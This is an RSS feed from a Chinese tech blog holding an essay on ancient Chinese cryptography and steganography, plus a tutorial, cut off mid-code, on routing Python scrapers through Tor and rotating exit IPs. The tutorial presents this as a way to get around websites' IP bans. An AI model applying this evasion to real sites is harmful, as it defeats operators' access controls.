<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>技术 &#8211; 有组织在!</title>
	<atom:link href="https://uzzz.org/category/jishu/feed" rel="self" type="application/rss+xml" />
	<link>https://uzzz.org/</link>
	<description></description>
	<lastBuildDate>Mon, 12 Aug 2019 07:37:18 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.2.4</generator>

<image>
	<url>https://uzzz.org/wp-content/uploads/2019/10/cropped-icon-32x32.png</url>
	<title>技术 &#8211; 有组织在!</title>
	<link>https://uzzz.org/</link>
	<width>32</width>
	<height>32</height>
</image> 
	<item>
		<title>本体技术视点 &#124; 长安望楼？这只是中国古代密码学应用的一角</title>
		<link>https://uzzz.org/article/2583.html</link>
				<pubDate>Mon, 12 Aug 2019 07:37:18 +0000</pubDate>
		<dc:creator><![CDATA[fandyvon]]></dc:creator>
				<category><![CDATA[技术]]></category>

		<guid isPermaLink="false">https://uzzz.org/article/2583.html</guid>
				<description><![CDATA[注：本文部分图片及文字来源于网络，仅供交流学习使用，不具有任何商业用途。 封面图来源：https://107cine.com/stream/112883 01 引言 天保三载，元月十四日，巳正。长安城一百零八坊沐浴在上午灿烂的阳光中。西市署署吏站在望楼上宣布西市开市，长安城暂停宵禁，全城沸腾。在这盛事背景下，长安城中暗藏的杀机开始显现，突厥狼卫伺机而动，一场惊心动魄的反恐行动就此展开。 &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;图 &#124; 网络 张小敬能够在追击狼卫的过程中处处取得先机得益于望楼及其通信系统。长安城中每一坊都设有二到三栋耸立的望楼，实时监视着城中异样，并用紫白色方格加以不同的组合，将消息快速传递给张小敬以及情报中心靖安司，以便他们快速作出决策。 &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;图 &#124;&#160;网络 望楼上的武侯掌握着一套密码通信系统，这是消息能较为安全传送的保证。简单来说，经过精心训练的坊间望楼武侯首先将要传递的消息按照既定的密码本将消息编码成算筹表示的数字，再用紫白色方格将数字表示并传递出去。接收到消息的靖安司大望楼武侯把颜色方格再转回数字，并将消息解码出来。 &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;图 &#124; 中国科学技术馆所展示的算筹 值得一提的是，中国古代在春秋战国时期就开始采用算筹计数法，在数学史上留下了一个个辉煌的记录，古代大将更是“运筹帷幄”，决胜千里之外。 &#160; 02&#160;中国古代的密码应用 今天，密码被广泛应用在生活中，银行卡刷卡、社交通信以及区块链交易等生活的方方面面都无时不刻在使用密码学保护金融安全和通信安全等。而在古代以及近代，无论是中国还是外国，密码一般都用于军事活动中。古罗马军事统帅凯撒在军队中使用替换加密技术来传递消息，而 Enigma 密码机的破译则加速了二战的结束，中国古代也有很多关于密码应用的记载。 2.1 阴符阴书通密语 公元前一千多年，姜子牙凭着满腹韬略辅佐周武王兴周灭商，为中国历史上存在时间最长朝代的建立创下了坚实的基础。据传为姜子牙所著的《六韬》更被被誉为是兵家权谋类的始祖。在这其中，姜子牙提出了采用阴符和阴书来进行保密通信。 姜子牙以八种不同长短的阴符分别表示八种战局结果，如长一尺的阴符表示大获全胜。只有君王和主将才明白这八种阴符代表的意义，这样敌人就较难识破它。可以看到，阴符可以传递的消息比较少，如果两军要配合出军作战，则可以使用阴书来进行联络军机要情。两军联络时，军情被拆分成三份，三个传令兵各持一份传递，只有合起来才能了解整个军情。阴书可以看作是较为典型的秘密分享方案原型。 2.2 虎符相合令千军 1973年，西安出土了一枚秦朝虎形兵符——秦杜虎符。作为国宝级的珍贵文物，该虎符现存于陕西历史博物馆中。虎符分为两半，右半符掌握在国君手中，左半符在将军手中。平时，将军持左半符可以命令五十人以下的士兵采取军事措施。凡要调动五十人以上的士兵，就要求左符和右符相合才能行动。但在紧急情况下，如狼烟起，将军亦可持半符便宜行事。 &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; 图 &#124; 陕历史博物馆的秦杜虎符 我们可以看到，现代在密码学中的认证也继承着这种精神，并把“我拥有什么”这样的认证进一步发展成“我知道什么”以及“天然的属性是什么”等多样化的认证方式。 2.3青鹅字拆宰相亡 公元684年，武则天废唐中宗李哲，开启则天朝的时代。徐敬业在扬州起兵反对武则天，同时由骆宾王主笔著名的《为徐敬业讨武曌檄》以号召天下勤王救国。此时，时任宰相裴炎和徐敬业的一封信被武则天获得，这封书信上并没有其它东西，只是上书“青鵝”两字。武则天破译了其中的密码规律，即把“青鵝”两字拆开，就变成“十二月，我自与”，这是相约时间做内应的意思。于是，裴炎被武则天当场拿下。 值得一提的是，在《资治通鉴》和《唐史》等正史均未有记载该青鹅事件。另外，骆宾王正是初唐四杰之一，于七岁成五言古诗《咏鹅》的唐代著名诗人。 2.4 太子梦破矾书显 白矾，是由明矾石经加工提炼而成。将白矾溶于水中，毛笔蘸着白矾水写字晾干后字迹会消失，重新浸于水中字迹就会重现。白矾水是中国古代军事和政治活动中应用较为广泛的一种隐写术。严格意义来说，隐写书并不属于密码学，但常用来进行秘密通信。 清康熙晚年，西北战事起。废太子胤礽想出征并领大将军的职务，并以此复出。于是胤礽托人用矾书代为传信，请人保举自己作为领兵大将。后来他人发现了该矾书，并向康熙告发。至此，胤礽恢复皇太子身份的计划彻底失败。 03 后记 古典密码学在古代和近代军事等活动中发挥了重大作用。如今，现代密码学在日常生活中展示着它的强大魅力，更是区块链技术的一个重要组成部分。本体技术团队将对相关密码学技术，如门限技术、零知识证明以及聚合签名等进行研究分析，为区块链安全以及区块链的广泛应用提供重要技术支撑。 本文的完成参考了包括国家密码管理局网站以及陕西历史博物馆网站等大量资料，受篇幅所限，并不一一列出，在此一并感谢。]]></description>
								<content:encoded><![CDATA[<div id="article_content" class="article_content clearfix">
 <!--一个博主专栏付费入口--><br />
 <!--一个博主专栏付费入口结束-->
 <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-d284373521.css">
 <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-d284373521.css">
<div class="htmledit_views" id="content_views">
<p><img alt="" class="has" src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X2pwZy9ObVRpYXZzakZOa0dxaDFNUWFTaWFDQ2JzalY0ZFlYTkhaaWFoWmliaWF2UmljeVNWRGlheXZSOEt4MWlhaGVTYkxxV2daYjBmYjNxS2ZqTjh4bnJWMGwyM2lhcThBUS82NDA_d3hfZm10PWpwZWcmdHA9d2VicCZ3eGZyb209NSZ3eF9sYXp5PTEmd3hfY289MQ"></p>
<p><strong><em>注：本文部分图片及文字来源于网络，仅供交流学习使用，不具有任何商业用途。</em></strong></p>
<p><strong><em>封面图来源：</em></strong><strong><em>https://107cine.com/stream/112883</em></strong></p>
<p><em><strong>01 引言</strong></em></p>
<p><img alt="" class="has" src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9ObVRpYXZzakZOa0cyTDZsa3pCVkNpY2liQmljdE9vd0dLM3djelY3ZXM3aWEzTWliV2N4RktITlZ6ZWlhQlZ1d0NlYVpGY3VraWNLbUxSdTNVbENDWjhGWFZHeWFnLzY0MD93eF9mbXQ9cG5nJnRwPXdlYnAmd3hmcm9tPTUmd3hfbGF6eT0xJnd4X2NvPTE"></p>
<p>天保三载，元月十四日，巳正。<strong>长安城</strong>一百零八坊沐浴在上午灿烂的阳光中。西市署署吏站在望楼上宣布西市开市，长安城暂停宵禁，全城沸腾。在这盛事背景下，长安城中暗藏的杀机开始显现，突厥狼卫伺机而动，一场惊心动魄的反恐行动就此展开。</p>
<p><img alt="" class="has" src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9ObVRpYXZzakZOa0cyTDZsa3pCVkNpY2liQmljdE9vd0dLM3djelY3ZXM3aWEzTWliV2N4RktITlZ6ZWlhQlZ1d0NlYVpGY3VraWNLbUxSdTNVbENDWjhGWFZHeWFnLzY0MD93eF9mbXQ9cG5nJnRwPXdlYnAmd3hmcm9tPTUmd3hfbGF6eT0xJnd4X2NvPTE"></p>
<p><img alt="" class="has" src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X2pwZy9ObVRpYXZzakZOa0cyTDZsa3pCVkNpY2liQmljdE9vd0dLM3dXQk85ZTN6SDZDMmt5Q1lSNWVCTGliRkh2TnlSQVJFQnlVN01MVGZTQlhuR2lhWWtBOVVZRWZ5US82NDA_d3hfZm10PWpwZWcmdHA9d2VicCZ3eGZyb209NSZ3eF9sYXp5PTEmd3hfY289MQ"></p>
<p><img alt="" class="has" src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9ObVRpYXZzakZOa0cyTDZsa3pCVkNpY2liQmljdE9vd0dLM3djelY3ZXM3aWEzTWliV2N4RktITlZ6ZWlhQlZ1d0NlYVpGY3VraWNLbUxSdTNVbENDWjhGWFZHeWFnLzY0MD93eF9mbXQ9cG5nJnRwPXdlYnAmd3hmcm9tPTUmd3hfbGF6eT0xJnd4X2NvPTE"></p>
<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;图 | 网络</p>
<p>张小敬能够在追击狼卫的过程中处处取得先机得益于<strong>望楼</strong>及其通信系统。长安城中每一坊都设有二到三栋耸立的望楼，实时监视着城中异样，并用紫白色方格加以不同的组合，将消息快速传递给张小敬以及情报中心靖安司，以便他们快速作出决策。</p>
<p><img alt="" class="has" src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9ObVRpYXZzakZOa0cyTDZsa3pCVkNpY2liQmljdE9vd0dLM3d2Q1hZbFp6VnlycHNydzVnWTNaNm9YOWliSURoODU0dWpUVTdQVTNMNVIyaWNVOXlDMVRnNmNwUS82NDA_d3hfZm10PXBuZyZ0cD13ZWJwJnd4ZnJvbT01Jnd4X2xhenk9MSZ3eF9jbz0x"></p>
<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;图 |&nbsp;网络</p>
<p>望楼上的武侯掌握着一套密码通信系统，这是消息能较为安全传送的保证。简单来说，经过精心训练的坊间望楼武侯首先将要传递的消息按照既定的密码本将消息编码成算筹表示的数字，再用紫白色方格将数字表示并传递出去。接收到消息的靖安司大望楼武侯把颜色方格再转回数字，并将消息解码出来。</p>
<p><img alt="" class="has" src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9ObVRpYXZzakZOa0cyTDZsa3pCVkNpY2liQmljdE9vd0dLM3d4ZjNYQmIxbkRQMDhERG5QaWJlaDdpYTBGS1RHbWlhbkRuSkhIeERIS0dGcGtVMjdObHppYXRnWVZ3LzY0MD93eF9mbXQ9cG5nJnRwPXdlYnAmd3hmcm9tPTUmd3hfbGF6eT0xJnd4X2NvPTE"></p>
<p>&nbsp;</p>
<p><img alt="" class="has" src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X2pwZy9ObVRpYXZzakZOa0cyTDZsa3pCVkNpY2liQmljdE9vd0dLM3d1bW5QWEVVNUQwM1B2QWlhRk01MUNHQ25LTlk0SWliVnhFNWZyV0FWZUZoeVppYW9DaWNlWUpCaWJBQS82NDA_d3hfZm10PWpwZWcmdHA9d2VicCZ3eGZyb209NSZ3eF9sYXp5PTEmd3hfY289MQ"></p>
<p><img alt="" class="has" src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9ObVRpYXZzakZOa0cyTDZsa3pCVkNpY2liQmljdE9vd0dLM3djelY3ZXM3aWEzTWliV2N4RktITlZ6ZWlhQlZ1d0NlYVpGY3VraWNLbUxSdTNVbENDWjhGWFZHeWFnLzY0MD93eF9mbXQ9cG5nJnRwPXdlYnAmd3hmcm9tPTUmd3hfbGF6eT0xJnd4X2NvPTE"></p>
<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;图 | 中国科学技术馆所展示的算筹</p>
<p>值得一提的是，中国古代在春秋战国时期就开始采用算筹计数法，在数学史上留下了一个个辉煌的记录，古代大将更是<strong>“运筹帷幄”</strong>，决胜千里之外。</p>
<p>&nbsp;</p>
<p><em><strong>02&nbsp;中国古代的密码应用</strong></em></p>
<p><img alt="" class="has" src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9ObVRpYXZzakZOa0cyTDZsa3pCVkNpY2liQmljdE9vd0dLM3djelY3ZXM3aWEzTWliV2N4RktITlZ6ZWlhQlZ1d0NlYVpGY3VraWNLbUxSdTNVbENDWjhGWFZHeWFnLzY0MD93eF9mbXQ9cG5nJnRwPXdlYnAmd3hmcm9tPTUmd3hfbGF6eT0xJnd4X2NvPTE"></p>
<p>今天，密码被广泛应用在生活中，银行卡刷卡、社交通信以及区块链交易等生活的方方面面都无时不刻在使用密码学保护金融安全和通信安全等。而在古代以及近代，无论是中国还是外国，密码一般都用于军事活动中。古罗马军事统帅凯撒在军队中使用替换加密技术来传递消息，而 Enigma 密码机的破译则加速了二战的结束，中国古代也有很多关于密码应用的记载。</p>
<p><strong>2.1 阴符阴书通密语</strong></p>
<p>公元前一千多年，姜子牙凭着满腹韬略辅佐周武王兴周灭商，为中国历史上存在时间最长朝代的建立创下了坚实的基础。据传为姜子牙所著的《六韬》更被被誉为是兵家权谋类的始祖。在这其中，姜子牙提出了采用阴符和阴书来进行保密通信。</p>
<p>姜子牙以八种不同长短的阴符分别表示八种战局结果，如长一尺的阴符表示大获全胜。只有君王和主将才明白这八种阴符代表的意义，这样敌人就较难识破它。可以看到，阴符可以传递的消息比较少，如果两军要配合出军作战，则可以使用阴书来进行联络军机要情。两军联络时，军情被拆分成三份，三个传令兵各持一份传递，只有合起来才能了解整个军情。阴书可以看作是较为典型的秘密分享方案原型。</p>
<p><strong>2.2 虎符相合令千军</strong></p>
<p>1973年，西安出土了一枚秦朝虎形兵符——<strong>秦杜虎符</strong>。作为国宝级的珍贵文物，该虎符现存于陕西历史博物馆中。虎符分为两半，右半符掌握在国君手中，左半符在将军手中。平时，将军持左半符可以命令五十人以下的士兵采取军事措施。凡要调动五十人以上的士兵，就要求左符和右符相合才能行动。但在紧急情况下，如狼烟起，将军亦可持半符便宜行事。</p>
<p>&nbsp;</p>
<p><img alt="" class="has" src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9ObVRpYXZzakZOa0cyTDZsa3pCVkNpY2liQmljdE9vd0dLM3dBVnJiQkdHeXc3WWVTSEVybWZoRHJLeGZ1NkdpY2licU45M2JXYXN6elF0RWFzeHhPN2lhR1ZhWlEvNjQwP3d4X2ZtdD1wbmcmdHA9d2VicCZ3eGZyb209NSZ3eF9sYXp5PTEmd3hfY289MQ"></p>
<p><img alt="" class="has" src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9ObVRpYXZzakZOa0cyTDZsa3pCVkNpY2liQmljdE9vd0dLM3djelY3ZXM3aWEzTWliV2N4RktITlZ6ZWlhQlZ1d0NlYVpGY3VraWNLbUxSdTNVbENDWjhGWFZHeWFnLzY0MD93eF9mbXQ9cG5nJnRwPXdlYnAmd3hmcm9tPTUmd3hfbGF6eT0xJnd4X2NvPTE"></p>
<p>&nbsp;</p>
<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 图 | 陕历史博物馆的秦杜虎符</p>
<p>我们可以看到，现代在密码学中的认证也继承着这种精神，并把“我拥有什么”这样的认证进一步发展成“我知道什么”以及“天然的属性是什么”等多样化的认证方式。</p>
<p><strong>2.3青鹅字拆宰相亡</strong></p>
<p>公元684年，武则天废唐中宗李哲，开启则天朝的时代。徐敬业在扬州起兵反对武则天，同时由骆宾王主笔著名的《为徐敬业讨武曌檄》以号召天下勤王救国。此时，时任宰相裴炎和徐敬业的一封信被武则天获得，这封书信上并没有其它东西，只是上书“青鵝”两字。武则天破译了其中的密码规律，即把“青鵝”两字拆开，就变成“十二月，我自与”，这是相约时间做内应的意思。于是，裴炎被武则天当场拿下。</p>
<p>值得一提的是，在《资治通鉴》和《唐史》等正史均未有记载该青鹅事件。另外，骆宾王正是初唐四杰之一，于七岁成五言古诗《咏鹅》的唐代著名诗人。</p>
<p><strong>2.4 太子梦破矾书显</strong></p>
<p>白矾，是由明矾石经加工提炼而成。将白矾溶于水中，毛笔蘸着白矾水写字晾干后字迹会消失，重新浸于水中字迹就会重现。白矾水是中国古代军事和政治活动中应用较为广泛的一种隐写术。严格意义来说，隐写书并不属于密码学，但常用来进行秘密通信。</p>
<p>清康熙晚年，西北战事起。废太子胤礽想出征并领大将军的职务，并以此复出。于是胤礽托人用矾书代为传信，请人保举自己作为领兵大将。后来他人发现了该矾书，并向康熙告发。至此，胤礽恢复皇太子身份的计划彻底失败。</p>
<p><em><strong>03 后记</strong></em></p>
<p><img alt="" class="has" src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9ObVRpYXZzakZOa0cyTDZsa3pCVkNpY2liQmljdE9vd0dLM3djelY3ZXM3aWEzTWliV2N4RktITlZ6ZWlhQlZ1d0NlYVpGY3VraWNLbUxSdTNVbENDWjhGWFZHeWFnLzY0MD93eF9mbXQ9cG5nJnRwPXdlYnAmd3hmcm9tPTUmd3hfbGF6eT0xJnd4X2NvPTE"></p>
<p>古典密码学在古代和近代军事等活动中发挥了重大作用。如今，现代密码学在日常生活中展示着它的强大魅力，更是区块链技术的一个重要组成部分。本体技术团队将对相关密码学技术，如门限技术、零知识证明以及聚合签名等进行研究分析，为区块链安全以及区块链的广泛应用提供重要技术支撑。</p>
<p>本文的完成参考了包括国家密码管理局网站以及陕西历史博物馆网站等大量资料，受篇幅所限，并不一一列出，在此一并感谢。</p>
</p></div>
</div>
]]></content:encoded>
										</item>
		<item>
		<title>Python爬虫-代理篇-TOR</title>
		<link>https://uzzz.org/article/1033.html</link>
				<pubDate>Mon, 01 Jul 2019 06:49:16 +0000</pubDate>
		<dc:creator><![CDATA[fandyvon]]></dc:creator>
				<category><![CDATA[技术]]></category>
		<category><![CDATA[tor]]></category>

		<guid isPermaLink="false">http://wp.uzzz.org/article/1033.html</guid>
				<description><![CDATA[Tor介绍 TOR是全球有名的匿名网络，具有很高的匿名性，简单点说，Tor网络利用流量转发的方式，达到隐藏真实请求端(客户端)的目的，是目前比较受欢迎也比较有名气的的匿名工具。其原理图如下 由于出口IP随机轮换，且具有很强的匿名性，因此我们可以使用Tor网络作为爬虫代理，用来解决一些网站的IP封禁问题。 Tor的安装和使用 Tor安装 sudo apt-get install tor 重启 sudo /etc/init.d/tor restart 生成密码 tor &#8211;hash-password mypassword 这个操作会生成一个Hash串 修改配置文件 命令 vim /etc/tor/torrc ControlPort 9051 HashedControlPassword 16:872860B76453A77D60CA2BB8C1A7042072093276A3D701AD684053EC4C Python使用Tor Python2 sudo pip install requests sudo pip install requesocks #!/usr/bin/python #coding:utf-8 import os import requesocks import socks import socket import requests import time import sys reload(sys) sys.setdefaultencoding('utf-8') url = 'http://api.ipify.org?format=json' def getip_requests(url): print "(+) Sending request with plain requests..." r = requests.get(url) print "(+) IP is: " + r.text.replace("\n", "") def getip_requesocks(url): print "(+) Sending request with requesocks..." session = requesocks.session() session.proxies = {'http': 'socks5://127.0.0.1:9050', 'https': 'socks5://127.0.0.1:9050'} r = session.get(url) print "(+) IP is: " + r.text.replace("\n", "") def main(): print "Running tests..." getip_requests(url) getip_requesocks(url) os.system("""(echo authenticate '"mypassword"'; echo signal newnym; echo \ quit) &#124; nc localhost 9051""") time.sleep(2) getip_requesocks(url) if __name__ == "__main__": main() Python3 sudo pip3 install pysocks #!/usr/bin/python3 import requests import time import sys import socket import socks socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050) socket.socket = socks.socksocket # 使用requests包进行常规请求即可 Python Tor管理包 stem 包官方文档 该包Python2和Python3均可以使用 pip install stem / sudo apt-get install python-stem from stem import Signal from stem.control import Controller # signal TOR]]></description>
								<content:encoded><![CDATA[<div id="article_content" class="article_content clearfix">
 <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-3019150162.css">
<div id="content_views" class="markdown_views prism-atom-one-dark">
  <!-- flowchart 箭头图标 勿删 --><br />
  <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
   <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
  </svg> </p>
<h3><a id="Tor_0"></a>Tor介绍</h3>
<blockquote>
<p>TOR是全球有名的匿名网络，具有很高的匿名性，简单点说，Tor网络利用流量转发的方式，达到隐藏真实请求端(客户端)的目的，是目前比较受欢迎也比较有名气的的匿名工具。其原理图如下<br /> <img src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190701141414416.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NwaXJpdGVkQXdheTExMDY=,size_16,color_FFFFFF,t_70" alt="Tor原理图"><br /> 由于出口IP随机轮换，且具有很强的匿名性，因此我们可以使用Tor网络作为爬虫代理，用来解决一些网站的IP封禁问题。</p>
</blockquote>
<hr>
<h3><a id="Tor_6"></a>Tor的安装和使用</h3>
<h4><a id="Tor_7"></a>Tor安装</h4>
<blockquote>
<p>sudo apt-get install tor</p>
</blockquote>
<h4><a id="_9"></a>重启</h4>
<blockquote>
<p>sudo /etc/init.d/tor restart</p>
</blockquote>
<h4><a id="_11"></a>生成密码</h4>
<blockquote>
<p>tor &#8211;hash-password mypassword<br /> 这个操作会生成一个Hash串</p>
</blockquote>
<h4><a id="_14"></a>修改配置文件</h4>
<blockquote>
<p>命令 vim /etc/tor/torrc</p>
<ul>
<li>ControlPort 9051</li>
<li>HashedControlPassword <s>16:872860B76453A77D60CA2BB8C1A7042072093276A3D701AD684053EC4C</s></li>
</ul>
</blockquote>
<h4><a id="PythonTor_19"></a>Python使用Tor</h4>
<h5><a id="Python2_20"></a>Python2</h5>
<blockquote>
<p>sudo pip install requests<br /> sudo pip install requesocks</p>
</blockquote>
<pre><code class="prism language-python"><span class="token comment">#!/usr/bin/python</span>
<span class="token comment">#coding:utf-8</span>

<span class="token keyword">import</span> os
<span class="token keyword">import</span> requesocks
<span class="token keyword">import</span> socks
<span class="token keyword">import</span> socket
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> time
<span class="token keyword">import</span> sys

<span class="token builtin">reload</span><span class="token punctuation">(</span>sys<span class="token punctuation">)</span>
sys<span class="token punctuation">.</span>setdefaultencoding<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>

url <span class="token operator">=</span> <span class="token string">'http://api.ipify.org?format=json'</span>


<span class="token keyword">def</span> <span class="token function">getip_requests</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span>  <span class="token string">"(+) Sending request with plain requests..."</span>
    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
    <span class="token keyword">print</span>  <span class="token string">"(+) IP is: "</span> <span class="token operator">+</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">getip_requesocks</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span>  <span class="token string">"(+) Sending request with requesocks..."</span>
    session <span class="token operator">=</span> requesocks<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
    session<span class="token punctuation">.</span>proxies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'http'</span><span class="token punctuation">:</span> <span class="token string">'socks5://127.0.0.1:9050'</span><span class="token punctuation">,</span>
                       <span class="token string">'https'</span><span class="token punctuation">:</span> <span class="token string">'socks5://127.0.0.1:9050'</span><span class="token punctuation">}</span>
    r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
    <span class="token keyword">print</span>  <span class="token string">"(+) IP is: "</span> <span class="token operator">+</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span>  <span class="token string">"Running tests..."</span>
    getip_requests<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
    getip_requesocks<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""(echo authenticate '"mypassword"'; echo signal newnym; echo \ quit) | nc localhost 9051"""</span><span class="token punctuation">)</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    getip_requesocks<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
    

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre>
<h5><a id="Python3_71"></a>Python3</h5>
<blockquote>
<p>sudo pip3 install pysocks</p>
</blockquote>
<pre><code class="prism language-python"><span class="token comment">#!/usr/bin/python3</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> time
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> socket
<span class="token keyword">import</span> socks

socks<span class="token punctuation">.</span>set_default_proxy<span class="token punctuation">(</span>socks<span class="token punctuation">.</span>SOCKS5<span class="token punctuation">,</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">9050</span><span class="token punctuation">)</span>
socket<span class="token punctuation">.</span>socket <span class="token operator">=</span> socks<span class="token punctuation">.</span>socksocket

<span class="token comment"># 使用requests包进行常规请求即可</span>

</code></pre>
<h4><a id="Python_Tor_stem_89"></a>Python Tor管理包 stem</h4>
<blockquote>
<ol>
<li>包<a href="https://stem.torproject.org/" rel="nofollow" title="stem包" data-token="8d2bddcbf812d7a9ac3b7dad2bbf5021">官方文档</a></li>
<li>该包Python2和Python3均可以使用</li>
<li>pip install stem / sudo apt-get install python-stem</li>
</ol>
</blockquote>
<pre><code class="prism language-python"><span class="token keyword">from</span> stem <span class="token keyword">import</span> Signal
<span class="token keyword">from</span> stem<span class="token punctuation">.</span>control <span class="token keyword">import</span> Controller

<span class="token comment"># signal TOR for a new connection </span>
<span class="token keyword">def</span> <span class="token function">renew_connection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
